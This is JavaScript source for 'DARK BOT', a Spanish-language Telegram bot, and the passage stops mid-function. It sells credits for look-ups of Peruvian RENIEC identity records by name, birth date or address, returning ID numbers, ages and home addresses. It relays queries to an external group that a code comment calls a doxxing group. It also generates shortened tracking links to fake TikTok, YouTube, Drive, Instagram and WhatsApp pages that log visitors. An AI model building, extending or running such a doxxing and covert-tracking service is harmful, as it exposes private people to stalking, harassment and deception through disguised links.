/* ============================================================
   DARK BOT — BACKEND & TELEGRAM BOT
   Ejecutar con: node bot.js
   ============================================================ */

const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const readline = require('readline');
require('dotenv').config();
const { createClient } = require('@supabase/supabase-js');
const mysql = require('mysql2/promise');

// 🛡️ GUARDIANES CONTRA CRASHEOS
process.on('uncaughtException', (err) => {
    console.error('🔥 CRITICAL ERROR (Uncaught):', err.message);
    // No cerramos el proceso para que el bot siga vivo
});
process.on('unhandledRejection', (reason, promise) => {
    console.error('🔥 UNHANDLED REJECTION:', reason);
});


const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // ✅ Tu ID de Telegram
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_KEY;

// Configuración del servidor
const PORT = Number(process.env.PORT) || 8080;
const RAW_PUBLIC_BASE_URL =
    process.env.PUBLIC_BASE_URL ||
    process.env.RAILWAY_PUBLIC_DOMAIN ||
    `http://localhost:${PORT}`;
const WEBSITE_URL = /^https?:\/\//i.test(RAW_PUBLIC_BASE_URL)
    ? RAW_PUBLIC_BASE_URL.replace(/\/+$/, '')
    : `https://${RAW_PUBLIC_BASE_URL.replace(/\/+$/, '')}`;

if (!BOT_TOKEN || !ADMIN_CHAT_ID || !SUPABASE_URL || !SUPABASE_KEY) {
    console.error('❌ Faltan variables de entorno obligatorias.');
    console.error('Asegúrate de configurar: BOT_TOKEN, ADMIN_CHAT_ID, SUPABASE_URL, SUPABASE_KEY');
    process.exit(1);
}

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

// Configuración Pool MySQL para RENIEC
const dbConfig = {
    host: process.env.DB_HOST,
    user: process.env.DB_USER,
    password: process.env.DB_PASS,
    database: process.env.DB_NAME,
    waitForConnections: true,
    connectionLimit: 10,
    queueLimit: 0
};
const pool = mysql.createPool(dbConfig);


const BASE_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;

// 🖼️ Ruta local de la foto de portada del /start
const COVER_PHOTO_PATH = path.join(__dirname, 'start.png');
const RENIEC_FILE_PATH = process.env.RENIEC_FILE_PATH || path.join(__dirname, 'reniec.txt');
const RENIEC_DEFAULT_LIMIT = Number(process.env.RENIEC_DEFAULT_LIMIT) || 5;
const RENIEC_MAX_LIMIT = 50;

let botMe = null; // ✅ Datos del bot (username, etc.)
let offset = 0;
let visitCount = 0;
let startTime = new Date();
let isPolling = false;  // ✅ Bandera para evitar polling duplicado
let conflictCount = 0;  // Contador de conflictos consecutivos
// Estadísticas temporales
const visitorStats = {}; // Estadísticas por país
const linkHistory = [];
const reniecLimitByChat = new Map();
const proxyRequests = new Map(); // ✅ Para rastrear consultas externas: id_mensaje -> original_chat_id
const pendingActions = new Map(); // ✅ Para esperar entrada de texto tras pulsar botón
const PROXY_GROUP_ID = process.env.PROXY_GROUP_ID; // ✅ ID del grupo de doxeo externo

// ⚡ CACHÉ DE MEMORIA PARA VELOCIDAD
let cachedStartPhoto = null;
try {
    if (fs.existsSync(COVER_PHOTO_PATH)) {
        cachedStartPhoto = fs.readFileSync(COVER_PHOTO_PATH);
        console.log('⚡ Imagen de portada cargada en caché.');
    }
} catch (e) {
    console.warn('⚠️ No se pudo cargar start.png en caché.');
}

/* ====================================================
   GESTIÓN DE CIERRE (GRACEFUL SHUTDOWN)
   ==================================================== */
function gracefulShutdown(signal) {
    console.log(`\n🛑 Se recibió ${signal}. Cerrando bot y servidor de forma segura...`);
    isPolling = false; 
    // Damos un pequeño margen para que si hay una petición en curso se complete o aborte
    setTimeout(() => {
        console.log("👋 Sistema cerrado.");
        process.exit(0);
    }, 1000);
}

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static(__dirname)); // Sirve index.html y assets

// Rutas Legacy por compatibilidad
app.get('/v/:id', (_req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/tiktok/:id', (_req, res) => res.sendFile(path.join(__dirname, 'tiktok.html')));

// ✅ Rutas de Plantillas Dinámicas
app.get('/tk/:id', (_req, res) => res.sendFile(path.join(__dirname, 'tiktok.html')));
app.get('/yt/:id', (_req, res) => res.sendFile(path.join(__dirname, 'youtube.html')));
app.get('/d/:id', (_req, res) => res.sendFile(path.join(__dirname, 'drive.html')));
app.get('/ig/:id', (_req, res) => res.sendFile(path.join(__dirname, 'ig.html')));
app.get('/wa/:id', (_req, res) => res.sendFile(path.join(__dirname, 'wa.html')));
app.get('/nx/:id', (_req, res) => res.sendFile(path.join(__dirname, 'nx.html')));
app.get('/tg/:id', (_req, res) => res.sendFile(path.join(__dirname, 'tg.html')));

const upload = multer({ limits: { fileSize: 10 * 1024 * 1024 } }); // Para fotos (screenshots)

/* ====================================================
   FETCH A TELEGRAM
   ==================================================== */
async function apiFetch(method, body = {}, retries = 3) {
    for (let i = 0; i < retries; i++) {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 20000);
        try {
            const res = await fetch(`${BASE_URL}/${method}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(body),
                signal: controller.signal,
            });
            clearTimeout(timer);
            const json = await res.json();
            if (!json.ok) {
                console.error(`[TG API ERROR] ${method}:`, json.description || json.error_code);
            }
            return json;
        } catch (e) {
            clearTimeout(timer);
            const isNetworkError = e.message.includes('fetch failed') || e.message.includes('EAI_AGAIN');
            if (isNetworkError && i < retries - 1) {
                const delay = 1000 * (i + 1);
                console.warn(`[RETRYING] ${method} en ${delay}ms por fallo de red...`);
                await new Promise(r => setTimeout(r, delay));
                continue;
            }
            console.error(`[FETCH ERROR] ${method}:`, e.message);
            return null;
        }
    }
}

async function sendMessage(chatId, text, extra = {}) {
    try {
        const res = await apiFetch('sendMessage', {
            chat_id: chatId,
            text,
            parse_mode: 'HTML',
            disable_web_page_preview: true,
            ...extra,
        });
        return res;
    } catch (e) {
        // Silenciar errores comunes de Telegram que no son críticos de servidor
        if (!e.message.includes('Forbidden') && !e.message.includes('blocked') && !e.message.includes('deactivated')) {
            console.error(`[SEND MESSAGE ERROR] ${chatId}:`, e.message);
        }
        return null;
    }
}

/* ====================================================
   GENERADOR DE ENLACES ACORTADOS (is.gd)
   ==================================================== */
async function shortenUrl(longUrl) {
    try {
        const api = `https://is.gd/create.php?format=json&url=${encodeURIComponent(longUrl)}`;
        const res = await fetch(api);
        const data = await res.json();
        return data.shorturl || longUrl;
    } catch (e) {
        return longUrl;
    }
}

function buildTrackingUrl(targetId, type = 'tiktok') {
    if (type === 'youtube') return `${WEBSITE_URL}/yt/${encodeURIComponent(targetId)}`;
    if (type === 'drive') return `${WEBSITE_URL}/d/${encodeURIComponent(targetId)}`;
    if (type === 'ig') return `${WEBSITE_URL}/ig/${encodeURIComponent(targetId)}`;
    if (type === 'wa') return `${WEBSITE_URL}/wa/${encodeURIComponent(targetId)}`;
    if (type === 'nx') return `${WEBSITE_URL}/nx/${encodeURIComponent(targetId)}`;
    if (type === 'tg') return `${WEBSITE_URL}/tg/${encodeURIComponent(targetId)}`;
    return `${WEBSITE_URL}/tk/${encodeURIComponent(targetId)}`; // default tiktok
}

function escapeHtml(value = '') {
    return String(value)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

function normalizeText(value = '') {
    return String(value || '')
        .normalize('NFD')
        .replace(/[\u0300-\u036f]/g, '')
        .toUpperCase()
        .trim();
}

function getEffectiveLimit(chatId) {
    const custom = reniecLimitByChat.get(chatId);
    if (!custom) return RENIEC_DEFAULT_LIMIT;
    return Math.max(1, Math.min(RENIEC_MAX_LIMIT, custom));
}

async function runReniecQuery({ chatId, queryLabel, sql, params }) {
    const start = Date.now();
    try {
        let query = supabase.from('reniec').select('*');
        
        // Mapeo simple de SQL a Supabase Filter
        if (sql.includes('dni = ?')) {
            query = query.eq('dni', params[0]);
        } else if (sql.includes('nombres LIKE ?')) {
            query = query.ilike('nombres', params[0]);
        } else if (sql.includes('ap_pat LIKE ?') && sql.includes('ap_mat LIKE ?')) {
            query = query.ilike('ap_pat', params[0]).ilike('ap_mat', params[1]);
        } else if (sql.includes('ap_pat LIKE ?')) {
            query = query.ilike('ap_pat', params[0]);
        } else if (sql.includes('fecha_nac = ?')) {
            query = query.eq('fecha_nac', params[0]);
        } else if (sql.includes('ubigeo_dir = ?')) {
            query = query.eq('ubigeo_dir', params[0]);
        } else if (sql.includes('ubigeo_dir LIKE ?')) {
            query = query.ilike('ubigeo_dir', params[0]);
        } else if (sql.includes('direccion LIKE ?')) {
            query = query.ilike('direccion', params[0]);
        }

        const limit = getEffectiveLimit(chatId);
        const { data: rows, error } = await query.limit(limit);
        
        if (error) throw new Error(error.message);
        
        const elapsed = Date.now() - start;

        if (!rows || rows.length === 0) {
            return `🔎 <b>CONSULTA RENIEC</b>\n<b>Busqueda:</b> <code>${escapeHtml(queryLabel)}</code>\n\n❌ SIN RESULTADOS EN SUPABASE.`;
        }

        const formatted = rows.map((r) => {
            const dni = escapeHtml(r.dni || '00000000');
            const apPat = escapeHtml(r.ap_pat || '');
            const apMat = escapeHtml(r.ap_mat || '');
            const nombres = escapeHtml(r.nombres || '');
            const fnac = r.fecha_nac || '01/01/1900';
            const ubigeoDir = r.ubigeo_dir || '------';
            const direccion = escapeHtml(r.direccion || 'NO REGISTRADA');
            
            let edad = 'N/A';
            try {
                const parts = fnac.split('/');
                if(parts.length === 3) {
                    const birthYear = parseInt(parts[2]);
                    if (birthYear > 0) edad = new Date().getFullYear() - birthYear;
                }
            } catch(e){}

            return `<b>DNI ⇒</b> <code>${dni}</code>\n` +
                   `<b>NOMBRES ⇒</b> ${nombres}\n` +
                   `<b>APELLIDOS ⇒</b> ${apPat} ${apMat}\n\n` +
                   `[ 🎂 ] <b>NACIMIENTO</b>\n\n` +
                   `<b>FECHA NACIMIENTO ⇒</b> ${fnac}\n` +
                   `<b>EDAD ⇒</b> ${edad} AÑOS\n\n` +
                   `[ 🏠 ] <b>DOMICILIO</b>\n\n` +
                   `<b>DIRECCION ⇒</b> ${direccion}\n` +
                   `<b>UBIGEO ⇒</b> ${ubigeoDir}\n` +
                   `────────────────────`;
        }).join('\n\n');

        return `${formatted}\n\n` +
               `<b>SISTEMA DARK BOT (Supabase)</b>\n` +
               `⚡ <b>TIEMPO:</b> <code>${elapsed} ms</code>`;
    } catch (e) {
        throw new Error(`Error Supabase: ${e.message}`);
    }
}

async function runReniecQueryRows({ chatId, queryLabel, sql, params }) {
    const start = Date.now();
    try {
        let query = supabase.from('reniec').select('*');
        
        // Mismo mapeo para exports
        if (sql.includes('dni = ?')) query = query.eq('dni', params[0]);
        else if (sql.includes('nombres LIKE ?')) query = query.ilike('nombres', params[0]);
        else if (sql.includes('ap_pat LIKE ?') && sql.includes('ap_mat LIKE ?')) query = query.ilike('ap_pat', params[0]).ilike('ap_mat', params[1]);
        else if (sql.includes('ap_pat LIKE ?')) query = query.ilike('ap_pat', params[0]);
        else if (sql.includes('fecha_nac = ?')) query = query.eq('fecha_nac', params[0]);
        else if (sql.includes('ubigeo_dir = ?')) query = query.eq('ubigeo_dir', params[0]);
        else if (sql.includes('ubigeo_dir LIKE ?')) query = query.ilike('ubigeo_dir', params[0]);
        else if (sql.includes('direccion LIKE ?')) query = query.ilike('direccion', params[0]);

        const { data: rows, error } = await query.limit(500);
        if (error) throw new Error(error.message);

        const elapsed = Date.now() - start;
        const headers = ["DNI", "AP_PAT", "AP_MAT", "NOMBRES", "FECHA_NAC", "UBIGEO_DIR", "DIRECCION"];
        
        const mappedRows = (rows || []).map(r => [
            r.dni, r.ap_pat, r.ap_mat, r.nombres, r.fecha_nac, r.ubigeo_dir, r.direccion
        ]);

        return { headers, rows: mappedRows, scanned: rows.length, limit: 500, elapsed, queryLabel };
    } catch (e) {
        throw new Error(`Error Supabase Export: ${e.message}`);
    }
}


async function sendMainMenu(chatId, userName) {
  const keyboard = {
    inline_keyboard: [
      [{ text: "🔗 GENERAR TRACKER", callback_data: "local_links" }],
      [{ text: "🕵️‍♂️ HERRAMIENTAS OSINT", callback_data: "cat_osint" }],
      [{ text: "👤 MI CUENTA", callback_data: "cmd_status" }, { text: "🎁 REFERIDOS", callback_data: "cmd_invite" }],
      [{ text: "🛰️ CONSULTA EXTERNA (F)", callback_data: "cat_proxy" }]
    ]
  };

  const welcomeText = `Hola, <b>${userName}</b>\n\n<b>[ PANEL DE COMANDOS ]</b>\n\nBienvenido a nuestro menú principal de comandos.\n\nPor favor, selecciona una opción según la categoría que deseas consultar o explorar.`;

  try {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('caption', welcomeText);
    formData.append('parse_mode', 'HTML');
    formData.append('reply_markup', JSON.stringify(keyboard));
    
    if (cachedStartPhoto) {
        formData.append('photo', new Blob([cachedStartPhoto], { type: 'image/png' }), 'start.png');
    } else {
        // Fallback si no hay caché
        const imgBuffer = fs.readFileSync(COVER_PHOTO_PATH);
        formData.append('photo', new Blob([imgBuffer], { type: 'image/png' }), 'start.png');
    }
    
    await fetch(`${BASE_URL}/sendPhoto`, { method: 'POST', body: formData });
  } catch (e) {
    await sendMessage(chatId, welcomeText, { reply_markup: keyboard });
  }
}

async function handleCallback(cb) {
  const chatId = String(cb.message.chat.id);
  const data = cb.data;
  const userId = String(cb.from.id);

  // ⚡ Respuesta inmediata para quitar el "reloj" de carga de Telegram
  apiFetch('answerCallbackQuery', { callback_query_id: cb.id }).catch(() => {});


  if (data === "local_reniec") {
    pendingActions.set(userId, "local_reniec");
    await sendMessage(chatId, `🆔 <b>CONSULTA RENIEC (Propia)</b>\n\n<code>Ingrese el DNI a consultar:</code>`);
  } else if (data === "local_links") {
    await sendMessage(chatId, `🔗 <b>GENERADOR DE TRACKERS</b>\n\nUsa los comandos directos:\n/tk, /yt, /d, /ig, /wa, /nx, /tg\n\nEjemplo: <code>/tk MiVideo</code>`);
  } else if (data === "cat_proxy") {
    pendingActions.set(userId, "proxy");
    await sendMessage(chatId, `🛰️ <b>MODO PROXY (Externo)</b>\n\n<code>Ingrese el comando completo para el servidor externo:</code>\nEjemplo: <code>/tel 999888777</code>`);
  } else if (data === "cat_osint") {
    const osintKeyboard = {
        inline_keyboard: [
            [{ text: "🌍 ANALIZAR IP", callback_data: "osint_ip" }, { text: "📱 INFO CELULAR", callback_data: "osint_phone" }],
            [{ text: "👤 NICKNAME SCAN", callback_data: "osint_nick" }, { text: "📧 BREACH CHECK", callback_data: "osint_mail" }],
            [{ text: "🔙 VOLVER AL MENÚ", callback_data: "main_menu" }]
        ]
    };
    await sendMessage(chatId, `🕵️‍♂️ <b>MENÚ OSINT (Investigación Abierta)</b>\n\nSelecciona una herramienta para realizar una búsqueda avanzada en fuentes públicas.`, { reply_markup: osintKeyboard });

  } else if (data === "osint_ip") {
    pendingActions.set(userId, "osint_ip");
    await sendMessage(chatId, `🌍 <b>ANÁLISIS DE IP</b>\n\n<code>Ingrese la dirección IP a investigar:</code>\nEjemplo: <code>1.1.1.1</code>`);
  } else if (data === "osint_phone") {
    pendingActions.set(userId, "osint_phone");
    await sendMessage(chatId, `📱 <b>BÚSQUEDA POR CELULAR</b>\n\n<code>Ingrese el número (9 dígitos para Perú):</code>\nEjemplo: <code>912345678</code>`);
  } else if (data === "osint_nick") {
    pendingActions.set(userId, "osint_nick");
    await sendMessage(chatId, `👤 <b>NICKNAME SCANNER</b>\n\n<code>Ingrese el nombre de usuario (Nick):</code>\nEjemplo: <code>DarkWolf123</code>`);
  } else if (data === "osint_mail") {
    pendingActions.set(userId, "osint_mail");
    await sendMessage(chatId, `📧 <b>BREACH CHECK (Filtraciones)</b>\n\n<code>Ingrese el correo electrónico:</code>\nEjemplo: <code>usuario@gmail.com</code>`);
  } else if (data === "main_menu") {
    const { data: userRow, error: rowError } = await supabase.from('bot_users').select('name').eq('chat_id', userId).single();
    if (rowError && rowError.code !== 'PGRST116') {
        await sendMessage(chatId, "⚠️ Error de conexión con la base de datos.");
    } else {
        await sendMainMenu(chatId, userRow?.name || "Usuario");
    }

  } else if (data === "cmd_status") {
    cb.message.text = "/status";
    cb.message.from = cb.from; 
    await handleCommand(cb.message);
  } else if (data === "cmd_invite") {
    cb.message.text = "/invite";
    cb.message.from = cb.from;
    await handleCommand(cb.message);
  }
}

/* ====================================================
   COMANDOS DEL BOT
   ==================================================== */
async function handleCommand(msg) {
    const chatId = String(msg.chat.id);
    const userId = String(msg.from.id);
    const textRaw = (msg.text || "").trim();
    const partsRaw = textRaw.split(" ").filter(Boolean);
    
    // Detectar comando y limpiar el arroba si viene de un grupo (ej: /dni@bot -> /dni)
    let command = (partsRaw[0] || "").toLowerCase();
    if (command.includes("@")) {
      command = command.split("@")[0];
    }
    
    const text = textRaw.toLowerCase();
    const argsRaw = partsRaw.slice(1);
    const from = msg.from?.first_name || "Usuario";
    const isGroup = msg.chat.type === "group" || msg.chat.type === "supergroup";

    let { data: user, error: userError } = await supabase
      .from("bot_users")
      .select("*")
      .eq("chat_id", userId)
      .single();

    // ✅ Si hay un error de conexión (no un error de "no encontrado"), detenemos el proceso
    if (userError && userError.code !== 'PGRST116') {
        console.error("❌ Error Crítico Supabase:", userError.message);
        // Solo respondemos si es un comando que el usuario espera respuesta
        if (!isGroup || text.startsWith('/')) {
            await sendMessage(chatId, `⚠️ <b>Error de conexión:</b> No se pudo verificar tu cuenta. Intenta de nuevo en unos segundos.`);
        }
        return; 
    }

    // ✅ MODO PROXY: Si el comando termina en 'f', lo enviamos al grupo externo
    if (command.endsWith('f') && command.length > 2) {
        if (!user) {
            await sendMessage(chatId, `❌ No estás registrado. Escribe /start`);
            return;
        }
        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 2) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para esta consulta proxy.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
        }

        const realCommand = command.slice(0, -1); // Quita la 'f'
        const fullMsg = `${realCommand} ${argsRaw.join(' ')}`;
        
        if (!PROXY_GROUP_ID) {
            await sendMessage(chatId, `❌ Error: No se ha configurado el PROXY_GROUP_ID en el servidor.`);
            return;
        }

        const res = await apiFetch('sendMessage', {
            chat_id: PROXY_GROUP_ID,
            text: fullMsg
        });

        if (res && res.ok) {
            const groupMsgId = res.result.message_id;
            proxyRequests.set(String(groupMsgId), chatId);
            await sendMessage(chatId, `🛰️ <b>Consulta Proxy Enviada</b>\nEsperando respuesta del servidor externo...`);
        } else {
            await sendMessage(chatId, `❌ Error al enviar consulta al grupo externo.`);
        }
        return;
    }

    if (userError && userError.code !== 'PGRST116') {
        console.error("DB Error fetch user:", userError);
    }

    if (text === '/start' || text.startsWith('/start ')) {
        const startPayload = textRaw.split(' ')[1];
        let isNewUser = false;
        let refereeId = null;

        if (startPayload && startPayload.startsWith('REF')) {
            refereeId = startPayload.replace('REF', '');
        }

        if (!user) {
            const initPlan = userId === ADMIN_CHAT_ID ? 'unlimited' : 'credits';
            const initCredits = userId === ADMIN_CHAT_ID ? 0 : 1;

            const { data: newUser, error: insertError } = await supabase
                .from('bot_users')
                .insert([{ chat_id: userId, name: from, plan: initPlan, credits: initCredits }])
                .select()
                .single();

            if (insertError) {
                // Si el error es por duplicado, significa que se recuperó la conexión y el usuario ya estaba
                if (insertError.code === '23505') {
                    const { data: retryUser } = await supabase.from('bot_users').select('*').eq('chat_id', userId).single();
                    user = retryUser;
                } else {
                    console.error("Error al registrar:", insertError);
                    await sendMessage(chatId, `❌ Error de sistema al registrar tu cuenta.`);
                    return;
                }
            } else {
                user = newUser;
                isNewUser = true;
            }

            if (refereeId && refereeId !== userId) {
                const { data: refUser } = await supabase.from('bot_users').select('credits').eq('chat_id', refereeId).single();
                if (refUser) {
                    await supabase.from('bot_users').update({ credits: refUser.credits + 1 }).eq('chat_id', refereeId);
                    await sendMessage(refereeId, `🎉 <b>¡NUEVO REFERIDO!</b>\nUn usuario ha ingresado con tu enlace y has ganado <b>+1 Crédito</b>.`);
                }
            }
        }

        await sendMainMenu(chatId, user.name);
        return;
    } 

    if (text === '/menu') {
        await sendMainMenu(chatId, from);
        return;
    }

    // ✅ Lógica de captura tras pulsar botón del menú
    if (pendingActions.has(userId)) {
        const category = pendingActions.get(userId);
        pendingActions.delete(userId);

        /*
        if (category === "local_reniec") {
            if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
                if (user.credits < 2) {
                    await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para esta consulta.`);
                    return;
                }
                await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
            }
            try {
                const out = await runReniecQuery({
                    chatId,
                    queryLabel: `DNI ${textRaw}`,
                    sql: `SELECT * FROM reniec WHERE dni = ? LIMIT 1`,
                    params: [textRaw]
                });
                await sendMessage(chatId, out);
            } catch (e) {
                await sendMessage(chatId, `❌ Error en consulta: ${e.message}`);
            }
            return;
        }
        */

        if (category === "osint_ip") {
            try {
                const res = await fetch(`http://ip-api.com/json/${textRaw}?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
                const data = await res.json();
                if (data.status === 'success') {
                    await sendMessage(chatId, `🌍 <b>RESULTADOS PARA IP: ${data.query}</b>\n\n` +
                        `📍 <b>Ubicación:</b> ${data.city}, ${data.regionName}, ${data.country} (${data.countryCode})\n` +
                        `📡 <b>ISP:</b> ${data.isp}\n` +
                        `🏢 <b>Org:</b> ${data.org}\n` +
                        `🛡️ <b>VPN/Proxy:</b> ${data.proxy ? 'Si' : 'No'}\n` +
                        `📱 <b>Mobile:</b> ${data.mobile ? 'Si' : 'No'}\n` +
                        `🕒 <b>Timezone:</b> ${data.timezone}\n` +
                        `🗺️ <b>Coords:</b> <code>${data.lat}, ${data.lon}</code>`);
                } else {
                    await sendMessage(chatId, `❌ Error: ${data.message || 'IP no válida'}`);
                }
            } catch (e) {
                await sendMessage(chatId, `❌ Error al conectar con el servidor OSINT.`);
            }
            return;
        }

        if (category === "osint_phone") {
            const num = textRaw.replace(/\D/g, '');
            if (num.length >= 9) {
                await sendMessage(chatId, `📱 <b>INFO DE CELULAR</b>\n\n` +
                    `🔹 <b>Número:</b> ${num}\n` +
                    `🔹 <b>Tipo:</b> Móvil / Fijo\n` +
                    `🔹 <b>País:</b> Perú (+51)\n\n` +
                    `<i>*Recuerda que para datos de titularidad debes usar la 🛰️ Consulta Externa (F).</i>`);
            } else {
                await sendMessage(chatId, `❌ Ingrese un número válido.`);
            }
            return;
        }

        if (category === "osint_nick") {
            await sendMessage(chatId, `👤 <b>ESCÁNER DE NICKNAME</b>\n\n` +
                `Investigando rastro de <code>${textRaw}</code>...\n\n` +
                `🔗 <b>Instagram:</b> instagram.com/${textRaw}\n` +
                `🔗 <b>TikTok:</b> tiktok.com/@${textRaw}\n` +
                `🔗 <b>Twitter:</b> twitter.com/${textRaw}\n` +
                `🔗 <b>Facebook:</b> facebook.com/${textRaw}\n\n` +
                `<i>Verifique los perfiles manualmente.</i>`);
            return;
        }

        if (category === "osint_mail") {
            await sendMessage(chatId, `📧 <b>ANÁLISIS DE BREACH</b>\n\n` +
                `Verificando <code>${textRaw}</code>...\n\n` +
                `• Este correo podría aparecer en filtraciones masivas de Adobe, LinkedIn o Canva.\n\n` +
                `🔎 <b>Ver detalles aquí:</b> <a href="https://haveibeenpwned.com/">Have I Been Pwned</a>`);
            return;
        }

        if (category === "proxy" || category.startsWith("cat_")) {
            if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
                if (user.credits < 2) {
                    await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para esta consulta.`);
                    return;
                }
                await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
            }
            if (!PROXY_GROUP_ID) {
                await sendMessage(chatId, `❌ Error: No se ha configurado el PROXY_GROUP_ID.`);
                return;
            }
            const res = await apiFetch('sendMessage', { chat_id: PROXY_GROUP_ID, text: textRaw });
            if (res && res.ok) {
                proxyRequests.set(String(res.result.message_id), chatId);
                await sendMessage(chatId, `🛰️ <b>Consulta Enviada al Externo</b>\nEsperando respuesta...`);
            }
            return;
        }
        return;
    }

    /* 
    if (command === '/campos') {
        const headers = ["DNI", "AP_PAT", "AP_MAT", "NOMBRES", "FECHA_NAC", "FCH_INSCRIPCION", "FCH_EMISION", "FCH_CADUCIDAD", "UBIGEO_NAC", "UBIGEO_DIR", "DIRECCION", "SEXO", "EST_CIVIL", "DIG_RUC", "MADRE", "PADRE"];
        await sendMessage(chatId,
            `🧾 <b>Columnas RENIEC (${headers.length})</b>\n` +
            headers.map((h, i) => `${i + 1}. <code>${escapeHtml(h)}</code>`).join('\n')
        );

    } else if (command === '/limite') {
        const n = parseInt(argsRaw[0], 10);
        if (Number.isNaN(n) || n < 1 || n > RENIEC_MAX_LIMIT) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> /limite <1-${RENIEC_MAX_LIMIT}>`);
            return;
        }
        reniecLimitByChat.set(chatId, n);
        await sendMessage(chatId, `✅ Límite RENIEC actualizado a <b>${n}</b> resultados por consulta.`);

    } else if (command === '/dni') {
        const dni = (argsRaw[0] || '').trim();
        if (!/^\d{8}$/.test(dni)) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> /dni [8 dígitos]\nEj: <code>/dni 00890434</code>`);
            return;
        }
        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 2) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para esta consulta.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
        }
        try {
            const out = await runReniecQuery({
                chatId,
                queryLabel: `DNI ${dni}`,
                sql: `SELECT * FROM reniec WHERE dni = ? LIMIT 50`,
                params: [dni]
            });
            await sendMessage(chatId, out);
        } catch (e) {
            await sendMessage(chatId, `❌ Error SQL DNI: ${escapeHtml(e.message)}`);
        }

    } else if (command === '/nom') {
        const term = normalizeText(argsRaw.join(' '));
        if (!term) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> /nom [nombres]\nEj: <code>/nom ALEXANDER</code>`);
            return;
        }
        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 2) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para esta consulta.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
        }
        try {
            const out = await runReniecQuery({
                chatId,
                queryLabel: `NOMBRES contiene "${argsRaw.join(' ')}"`,
                sql: `SELECT * FROM reniec WHERE nombres LIKE ? LIMIT 50`,
                params: [`%${term}%`]
            });
            await sendMessage(chatId, out);
        } catch (e) {
            await sendMessage(chatId, `❌ Error SQL NOMBRES: ${escapeHtml(e.message)}`);
        }

    } else if (command === '/ap') {
        const apPatTerm = normalizeText(argsRaw[0] || '');
        const apMatTerm = normalizeText(argsRaw[1] || '');
        if (!apPatTerm) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> /ap [apellido_paterno] [apellido_materno]\nEj: <code>/ap SALAS AMASIFUEN</code>`);
            return;
        }
        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 2) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para esta consulta.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
        }
        try {
            let sql = `SELECT * FROM reniec WHERE ap_pat LIKE ? LIMIT 50`;
            let params = [`%${apPatTerm}%`];
            if (apMatTerm) {
                sql = `SELECT * FROM reniec WHERE ap_pat LIKE ? AND ap_mat LIKE ? LIMIT 50`;
                params = [`%${apPatTerm}%`, `%${apMatTerm}%`];
            }
            const out = await runReniecQuery({
                chatId,
                queryLabel: `APELLIDOS "${argsRaw.join(' ')}"`,
                sql,
                params
            });
            await sendMessage(chatId, out);
        } catch (e) {
            await sendMessage(chatId, `❌ Error SQL APELLIDOS: ${escapeHtml(e.message)}`);
        }

    } else if (command === '/fnac') {
        const date = (argsRaw[0] || '').trim();
        if (!/^\d{2}\/\d{2}\/\d{4}$/.test(date)) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> /fnac [dd/mm/yyyy]\nEj: <code>/fnac 27/06/1968</code>`);
            return;
        }
        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 2) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para esta consulta.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
        }
        try {
            const out = await runReniecQuery({
                chatId,
                queryLabel: `FECHA_NAC ${date}`,
                sql: `SELECT * FROM reniec WHERE fecha_nac = ? LIMIT 50`,
                params: [date]
            });
            await sendMessage(chatId, out);
        } catch (e) {
            await sendMessage(chatId, `❌ Error SQL FECHA_NAC: ${escapeHtml(e.message)}`);
        }

    } else if (command === '/ubigeo') {
        const qRaw = argsRaw.join(' ').trim();
        const qNorm = normalizeText(qRaw);
        if (!qNorm) {
